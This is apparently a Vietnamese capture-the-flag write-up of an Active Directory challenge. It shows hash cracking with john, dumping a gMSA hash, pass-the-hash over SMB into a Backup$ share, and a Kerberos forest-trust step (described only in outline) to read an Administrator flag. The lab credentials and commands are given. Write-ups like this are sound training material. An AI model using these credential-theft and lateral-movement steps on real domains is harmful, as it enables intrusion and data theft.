# HackLu Active Directory — Forest / Granite

## Kết quả

Flag đầy đủ:

```text
flag{m0v3_f4st_br34k_th3_f0r3st_89a71f9g}
```

Flag được ghép từ hai phần đọc trực tiếp trên hai máy:

```text
DC-OLD: flag{m0v3_f4st_br34k
DC-NEW: _th3_f0r3st_89a71f9g}
```

## Ý tưởng chính

Flow của bài là:

```text
NTLM hash của svc_granite_sync
        ↓ crack password
svc_granite_sync / Granite00!
        ↓ LDAP/AD enumeration
gMSA backup$ và NT hash của nó
        ↓ Pass-the-Hash
đọc Backup$ trên DC-OLD
        ↓ dùng đường Kerberos/forest để sang DC-NEW
đọc flag.txt trên Administrator Desktop
```

Điểm dễ nhầm là phần cuối không phải chỉ crack thêm một NTLM hash. Phần hai yêu cầu đi theo authentication Kerberos trong forest/trust path.

## 1. Kết nối và nhận diện máy

WireGuard cấp hai địa chỉ dịch vụ:

```text
DC-OLD / parent: 10.244.0.10
DC-NEW / child:  10.244.0.20
```

Thêm cả hai máy vào `/etc/hosts` theo tên hiển thị trong challenge. Sau khi bật tunnel, kiểm tra các cổng AD/SMB:

```bash
ping -c 2 10.244.0.10
ping -c 2 10.244.0.20
nmap -Pn -sV -p 53,88,135,139,389,445,464,636 \
  10.244.0.10 10.244.0.20
```

ICMP không phải điều kiện bắt buộc; trong một số lần chạy SMB vẫn mở dù ping tới một máy không trả lời.

## 2. Crack credential của `svc_granite_sync`

Hash NTLM của user được tìm thấy trong các artefact/ghi chú của bài. Đưa hash vào file, sau đó dùng wordlist kèm rule `best64`:

```bash
john --format=NT --wordlist=<wordlist> --rules=best64 hashes.txt
john --show --format=NT hashes.txt
```

Kết quả:

```text
svc_granite_sync : Granite00!
```

Ảnh bằng chứng: [`photo_2026-10-24_22-21-05.jpg`](../misc/activedirectory/photo_2026-10-24_22-21-05.jpg).

## 3. Dùng credential để enumerate AD và đọc gMSA

Đăng nhập bằng `svc_granite_sync`, enumerate LDAP và kiểm tra các account có thuộc tính quản lý mật khẩu gMSA (`msDS-ManagedPassword`). Account backup của parent là:

```text
backup$
```

Hash NTLM thu được cho gMSA:

```text
15864956d21b599903ec7b59bf72c388
```

Có thể dùng công cụ gMSA tương ứng trong bộ Impacket/AD để đọc thuộc tính này, ví dụ dạng lệnh:

```bash
gMSADumper.py -u svc_granite_sync -p 'Granite00!' \
  -d '<DOMAIN>' -l <DC-IP>
```

Tên domain và tên máy cụ thể nên lấy lại từ output LDAP/DNS của instance, không hard-code theo một instance khác.

Ảnh bằng chứng: [`photo_2026-10-24_22-44-10.jpg`](../misc/activedirectory/photo_2026-10-24_22-44-10.jpg).

## 4. Pass-the-Hash vào `backup$` và đọc `Backup$`

Dùng NT hash của gMSA thay cho password:

```bash
smbclient.py -hashes ':15864956d21b599903ec7b59bf72c388' \
  '<DOMAIN>/backup$@<DC-OLD>'
```

Trong SMB shell, liệt kê share và vào share backup:

```text
shares
use Backup$
ls
```

`Backup$` là bước chuyển quyền quan trọng: credential của gMSA được dùng để đọc các dữ liệu backup/artefact của parent, thay vì thử brute-force trực tiếp Administrator.

## 5. Đi theo Kerberos để lấy phần thứ hai

Sau khi có dữ liệu từ parent, dùng thông tin domain/trust và ticket Kerberos để xác thực sang phía DC-NEW. Trình tự tổng quát:

```text
thu thập domain/trust/credential material từ DC-OLD
        ↓
xin hoặc nạp Kerberos ticket phù hợp
        ↓
truy cập SMB của DC-NEW bằng Kerberos
        ↓
đọc C:\Users\Administrator\Desktop\flag.txt
```

Trong output SMB, file được xác nhận ở:

```text
C$\Users\Administrator\Desktop\flag.txt
```

Nội dung phần trên DC-NEW là:

```text
_th3_f0r3st_89a71f9g}
```

Ảnh bằng chứng phần đầu trên DC-OLD: [`photo_2026-10-24_22-56-03.jpg`](../misc/activedirectory/photo_2026-10-24_22-56-03.jpg).

## 6. Ghép flag

```text
flag{m0v3_f4st_br34k
+ _th3_f0r3st_89a71f9g}
--------------------------------
flag{m0v3_f4st_br34k_th3_f0r3st_89a71f9g}
```

## Ghi chú tránh lỗi

- Không dùng chung một WireGuard key với đồng đội; mỗi key chỉ được dùng bởi một máy tại một thời điểm.
- Không paste cả prompt/output của terminal vào shell. Chỉ chạy phần bắt đầu từ lệnh (`sudo`, `smbclient.py`, `john`, …).
- Không kết luận mất kết nối chỉ vì ping fail; kiểm tra thêm handshake WireGuard và cổng TCP 445.
- Phân biệt password đã crack (`Granite00!`) với NTLM hash của gMSA (`15864956d21b599903ec7b59bf72c388`).
- Phần sau của flag đến từ đường Kerberos/forest, không phải nối thêm chuỗi từ hash.
